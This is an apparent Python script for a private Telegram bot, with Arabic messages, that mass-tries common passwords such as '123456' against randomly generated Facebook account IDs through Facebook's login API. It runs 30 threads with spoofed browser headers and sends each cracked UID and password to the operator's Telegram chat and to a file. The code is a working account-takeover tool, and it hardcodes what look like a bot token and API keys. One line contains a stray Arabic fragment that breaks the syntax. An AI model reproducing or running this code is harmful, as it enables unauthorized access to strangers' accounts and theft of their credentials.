import os
import time
import random
import uuid
import sys
import threading
from concurrent.futures import ThreadPoolExecutor as tre
from flask import Flask
import requests
import telebot
from telebot import types

# ========== إعدادات ثابتة ==========
TOKEN = "8638828289:AAECoBsql6F-uY4sk7NUQvBURi6ajfqvXJ8"
CHAT_ID = "7200921345"  # الآيدي حقك
TARGET_FILE = "SHMRI-OLD-OK.txt"

# ========== Flask للسيرفر ==========
app = Flask(__name__)

@app.route("/")
def index():
    return "FB Checker Bot is running!"

def keep_alive():
    t = threading.Thread(target=lambda: app.run(host="0.0.0.0", port=10000))
    t.daemon = True
    t.start()

bot = telebot.TeleBot(TOKEN)
loop_counter = 0
ok_list = []
running = False
STOP_FLAG = threading.Event()

# ========== دوال مساعدة ==========
def windows():
    versions = [
        f"Mozilla/5.0 (Windows NT {random.choice([10,11])}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,130)}.0.{random.randint(6000,7000)}.{random.randint(50,200)} Safari/537.36",
        f"Mozilla/5.0 (Windows NT {random.choice([10,11])}.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,130)}.0.{random.randint(6000,7000)}.{random.randint(50,200)} Safari/537.36",
    ]
    return random.choice(versions)

def creation_year(uid):
    uid_str = str(uid)
    if len(uid_str) == 15:
        if uid_str.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
        elif uid_str.startswith(('1000006', '1000007', '1000008', '1000009')): return '2010'
        elif uid_str.startswith('100001'): return '2010'
        elif uid_str.startswith(('100002', '100003')): return '2011'
        elif uid_str.startswith('100004'): return '2012'
        elif uid_str.startswith(('100005', '100006')): return '2013'
        elif uid_str.startswith(('100007', '100008')): return '2014'
        elif uid_str.startswith('100009'): return '2015'
        elif uid_str.startswith('10001'): return '2016'
        elif uid_str.startswith('10002'): return '2017'
        elif uid_str.startswith('10003'): return '2018'
        elif uid_str.startswith('10004'): return '2019'
        elif uid_str.startswith('10005'): return '2020'
        elif uid_str.startswith('10006'): return '2021'
        elif uid_str.startswith(('10007', '10008')): return '2022'
        elif uid_str.startswith('10009'): return '2023'
    elif len(uid_str) in (9, 10): return '2008'
    elif len(uid_str) == 8: return '2007'
    elif len(uid_str) == 7: return '2006'
    elif len(uid_str) == 14 and uid_str.startswith('61'): return '2024'
    return 'Unknown'

# ========== دالة الفحص ==========
def login_attempt(uid):
    global loop_counter
    if STOP_FLAG.is_set():
        return
        
    session = requests.Session()
    passwords = ['123456', '1234567', '12345678', '123456789', 'password', '1234567890']
    try:
        for pw in passwords:
            if STOP_FLAG.is_set():
                break
            headers = {
                'User-Agent': windows(),
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'Origin': 'https://www.facebook.com',
                'Referer': 'https://www.facebook.com/',
            }
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': pw,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            resp = session.post('https://graph.facebook.com/v21.0/auth/login', data=data, headers=headers, allow_redirects=False)
            try:
                res = resp.json()
            except:
                continue
                
            if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                is_cp = 'session_key' not in res
                uid_url = f'https://www.facebook.com/profile.php?id={uid}'
                status = "Checkpoint" if is_cp else "Hit"
                
                telegram_msg = f"📦 Facebook {status}\nUID: {uid}\nPASS: {pw}\nYear: {creation_year(uid)}\nLink: {uid_url}"
                bot.send_message(CHAT_ID, telegram_msg)
                
                with open(TARGET_FILE, 'a') as f:
                    f.write(f"{uid}|{pw}\n")
                ok_list.append(uid)
                break
                
        loop_counter += 1
        # تحديث حالة البوت كل 100 محاولة
        if loop_counter % 100 == 0:
            bot.send_message(CHAT_ID, f"🔄 جاري الفحص...\nتم فحص: {loop_counter} حساب\nالصيد: {len(ok_list)}")
            
    except Exception:
        time.sleep(1)

# ========== دوال التشغيل ==========
def run_checker(limit, mode):
    global loop_counter, ok_list
    running = True
    STOP_FLAG.clear()
    loop_counter = 0
    ok_list = []
    
    user = []
    if mode == '1': # Old Clone
        for _ in range(limit):
            user.append('100003' + ''.join(random.choices('0123456789', k=9)))
    elif mode == '2': # 100003/100004
        for _ in range(limit):
            prefix = random.choice(['100003', '100004'])
            user.append(prefix + ''.join(random.choices('0123456789', k=9)))
    elif mode == '3': # 2009-2010
        for _ in range(limit):
            user.append('1000004' + ''.join(random.choices('0123456789', k=8)))
    elif mode == '4': # Hunt 2001-2006
        for _ in range(limit):
            length = random.randint(6, 8)
            if length == 6: uid = str(random.randint(100000, 999999))
            elif length == 7: uid = str(random.randint(1000000, 9999999))
            else: uid = str(random.randint(10000000, 99999999))
            user.append(uid)

    bot.send_message(CHAT_ID, f"🚀 بدأ الصيد!\nالطريقة: {mode}\nالعدد المطلوب: {limit}")
    
    with tre(max_workers=30) as pool:
        for uid in user:
            pool.submit(login_attempt, uid)
            
    bot.send_message(CHAT_ID, f"🏁 انتهى الصيد!\nتم فحص: {loop_counter}\nالصيد: {len(ok_list)}")

# ========== أوامر البوت ==========
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if str(message.chat.id) != CHAT_ID and str(message.from_user.id) != CHAT_ID:
        bot.reply_to(message, "عذراً، هذا البوت خاص.")
        return
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton("1) Old Clone")
    btn2 = types.KeyboardButton("2) 100003/100004")
    btn3 = types.KeyboardButton("3) 2009-2010")
    btn4 = types.KeyboardButton("4) Hunt 2001-2006")
    btn_stop = types.KeyboardButton("🛑 إيقاف الفحص")
    markup.add(btn1, btn2, btn3, btn4, btn_stop)
    
    bot.send_message(message.chat.id, "أهلاً بك في بوت صيد فيسبوك (OMAR).\nاختر الطريقة اللي تبي تفحص بها:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text in ["1) Old Clone", "2) 100003/100004", "3) 2009-2010", "4) Hunt 2001-2006"])
def ask_limit(message):
    mode = message.text[0] # 1, 2, 3, 4
    msg = bot.reply_to(message, "كم عدد الحسابات اللي تبي تفحصها؟ (مثال: 1000)")
    bot.register_next_step_handler(msg, lambda m: start_task(m, mode))

def start_task(message, mode):
    if running:
        bot.reply_to(message, "⚠️ الفحص شغال حالياً، انتظر يخلص أو اضغط إيقاف.")
        return
    try:
        limit = int(message.text.strip())
        if limit <= 0: raise ValueError
    except:
        bot.reply_to(message, "❌ رقم غير صحيح، جرب مرة ثانية.")
        return الأ
        
    threading.Thread(target=run_checker, args=(limit, mode), daemon=True).start()

@bot.message_handler(func=lambda message: message.text == "🛑 إيقاف الفحص")
def stop_task(message):
    STOP_FLAG.set()
    bot.reply_to(message, "🛑 تم إرسال أمر الإيقاف، انتظر ثواني لين يوقف.")

# ========== تشغيل ==========
if __name__ == "__main__":
    keep_alive()
    print("FB Bot is running...")
    bot.infinity_polling()
